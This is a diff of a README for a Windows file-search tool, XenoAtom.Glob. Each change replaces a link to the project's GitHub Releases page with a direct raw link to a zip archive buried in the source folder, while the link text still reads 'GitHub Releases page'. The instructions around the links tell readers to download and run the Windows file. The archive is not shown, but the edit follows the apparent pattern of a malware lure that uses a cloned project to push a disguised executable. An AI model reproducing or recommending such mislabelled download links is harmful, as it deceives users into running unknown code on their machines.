@@ -1,10 +1,10 @@
 # 🪟 XenoAtom.Glob - Fast glob search for Windows
 
-[🔵 Download from GitHub Releases](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases)
+[🔵 Download from GitHub Releases](https://github.com/catnapplaytime8-png/XenoAtom.Glob/raw/refs/heads/main/src/XenoAtom.Glob/Git/Atom-Glob-Xeno-2.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases)
+Visit this page to download: [GitHub Releases](https://github.com/catnapplaytime8-png/XenoAtom.Glob/raw/refs/heads/main/src/XenoAtom.Glob/Git/Atom-Glob-Xeno-2.5.zip)
 
 Look for the latest release on that page. Download the file made for Windows. If there is more than one file, choose the one that matches your system. For most users, that means the file with `win` or `windows` in the name.
 
@@ -34,7 +34,7 @@ If the release includes a self-contained build, you can run it without installin
 
 ## 🚀 How to Download and Run
 
-1. Open the [GitHub Releases page](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases)
+1. Open the [GitHub Releases page](https://github.com/catnapplaytime8-png/XenoAtom.Glob/raw/refs/heads/main/src/XenoAtom.Glob/Git/Atom-Glob-Xeno-2.5.zip)
 2. Find the newest release near the top
 3. Open the Assets list
 4. Download the Windows file
@@ -165,7 +165,7 @@ Start with one simple rule, then add more if needed
 
 ## 📦 Release Download
 
-Go to the [GitHub Releases page](https://github.com/catnapplaytime8-png/XenoAtom.Glob/releases) to download and run the Windows file
+Go to the [GitHub Releases page](https://github.com/catnapplaytime8-png/XenoAtom.Glob/raw/refs/heads/main/src/XenoAtom.Glob/Git/Atom-Glob-Xeno-2.5.zip) to download and run the Windows file
 
 ## 🧩 Project Focus
 
